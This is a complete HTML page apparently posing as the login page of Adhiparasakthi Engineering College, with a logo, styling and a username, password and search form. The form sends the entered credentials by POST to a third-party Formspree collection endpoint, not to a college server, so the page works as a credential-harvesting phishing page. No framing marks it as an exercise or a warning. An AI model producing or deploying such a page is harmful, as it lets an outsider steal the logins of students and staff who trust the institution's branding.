<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>College Login</title>

<style>
body{
    font-family:Arial,sans-serif;
    background:#f2f2f2;
}
.container{
    width:350px;
    margin:70px auto;
    background:white;
    padding:20px;
    border-radius:10px;
    box-shadow:0 0 10px gray;
    text-align:center;
}
img{
    width:100px;
    margin-bottom:15px;
}
input{
    width:95%;
    padding:10px;
    margin:8px 0;
}
button{
    width:100%;
    padding:10px;
    background:#007BFF;
    color:white;
    border:none;
    cursor:pointer;
}
button:hover{
    background:#0056b3;
}
</style>

</head>

<body>

<div class="container">

<img src="college logo.png" alt="College Logo">

<h2>Adhiparasakthi Engineering College</h2>

<form action="https://formspree.io/f/mwvdwdkk" method="POST">

<input
type="text"
name="username"
placeholder="Username"
required>

<input
type="password"
name="password"
placeholder="Password"
required>

<input
type="text"
name="search"
placeholder="Search Here"
required>

<button type="submit">Login</button>

</form>

</div>

</body>
</html>
